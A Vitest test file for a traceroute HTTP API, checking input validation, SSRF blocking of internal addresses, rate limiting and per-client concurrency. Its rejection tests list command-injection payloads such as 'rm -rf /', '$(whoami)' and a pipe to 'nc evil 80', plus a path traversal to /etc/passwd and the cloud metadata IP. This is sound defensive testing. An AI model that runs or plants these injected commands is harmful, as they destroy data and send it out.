import { describe, it, expect, beforeEach } from 'vitest';
import { buildApp } from '../src/app.js';
import { resolveTarget } from '../src/services/dns.js';

const config = {
  trustProxy: false,
  corsOrigins: [],
  trace: { maxHops: 30, timeoutMs: 5000, probeTimeoutMs: 500 },
  rateLimit: { max: 3, timeWindow: 60_000 },
  concurrency: { maxGlobal: 4, maxPerClient: 1 },
  geo: { provider: 'none', dataDir: '', origin: null },
};

// DNS falso: "intranet.example.com" resuelve a una IP privada, el resto a GitHub
const fakeLookup = async (name) => [
  { address: name === 'intranet.example.com' ? '10.0.0.5' : '140.82.121.4', family: 4 },
];

// Servicios falsos: no se resuelve DNS real ni se ejecuta ningún comando
const fakeServices = (overrides = {}) => ({
  resolveTarget: (t) => resolveTarget(t, { lookup: fakeLookup }),
  reverseLookup: async (ip) => (ip === '140.82.121.4' ? 'lb.github.com' : null),
  geo: {
    providers: ['fake'],
    lookup: async (ip) =>
      ip === '140.82.121.4' ? { city: 'Fráncfort', countryCode: 'DE', lat: 50.1, lon: 8.7, isp: 'GitHub', asn: 36459 } : null,
  },
  origin: Promise.resolve({ lat: 41.39, lon: 2.17, city: 'Barcelona', countryCode: 'ES' }),
  runTraceroute: async function* () {
    yield { hop: 1, ip: '192.168.1.1', rtts: [1, 1, 1] };
    yield { hop: 2, ip: null, rtts: [null, null, null] };
    yield { hop: 3, ip: '140.82.121.4', rtts: [30, 31, 32] };
  },
  ...overrides,
});

let app;
beforeEach(async () => {
  app = await buildApp({ config, services: fakeServices(), logger: false });
});

const trace = (target) => app.inject({ method: 'GET', url: '/api/trace', query: { target } });

describe('GET /api/trace', () => {
  it('devuelve los saltos con estado y hostname', async () => {
    const res = await trace('GitHub.com');
    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body).toMatchObject({ target: 'github.com', resolvedIp: '140.82.121.4', reached: true });
    expect(body.hops.map((h) => h.status)).toEqual(['private', 'timeout', 'ok']);
    expect(body.origin.city).toBe('Barcelona');
    expect(body.hops[2].geo).toMatchObject({ city: 'Fráncfort', asn: 36459 });
    expect(body.hops[2]).toMatchObject({ hostname: 'lb.github.com', latency: 31 });
  });

  it.each([
    'google.com; rm -rf /',
    '$(whoami).com',
    '`id`',
    'google.com && calc',
    '-w 1 google.com',
    '--help',
    '1.1.1.1 | nc evil 80',
    '../../etc/passwd',
    'goo gle.com',
    '256.1.1.1',
    'localhost',
  ])('rechaza la entrada maliciosa o inválida %j', async (target) => {
    const res = await trace(target);
    expect(res.statusCode).toBe(400);
    expect(res.json().error.code).toBe('INVALID_TARGET');
  });

  it.each([
    '127.0.0.1',
    '10.0.0.1',
    '192.168.1.1',
    '169.254.169.254', // metadatos de AWS/Azure/GCP: objetivo clásico de SSRF
    '224.0.0.1',
    '::1',
    'intranet.example.com',
  ])('no permite trazar destinos internos: %s', async (target) => {
    const res = await trace(target);
    expect(res.statusCode).toBe(403);
    expect(res.json().error.code).toBe('TARGET_NOT_ALLOWED');
  });

  it('exige el parámetro target', async () => {
    const res = await app.inject({ method: 'GET', url: '/api/trace' });
    expect(res.statusCode).toBe(400);
  });

  it('aplica el rate limit por IP', async () => {
    const codes = [];
    for (let i = 0; i < 4; i++) codes.push((await trace('github.com')).statusCode);
    expect(codes).toEqual([200, 200, 200, 429]);
  });

  it('solo permite un trace simultáneo por IP', async () => {
    let finish;
    const slow = await buildApp({
      config,
      logger: false,
      services: fakeServices({
        runTraceroute: async function* () {
          await new Promise((r) => (finish = r));
          yield { hop: 1, ip: '140.82.121.4', rtts: [1] };
        },
      }),
    });
    const first = slow.inject({ method: 'GET', url: '/api/trace?target=github.com' });
    await new Promise((r) => setTimeout(r, 20));
    const second = await slow.inject({ method: 'GET', url: '/api/trace?target=github.com' });
    expect(second.json().error.code).toBe('TOO_MANY_TRACES');
    finish();
    expect((await first).statusCode).toBe(200);
  });
});
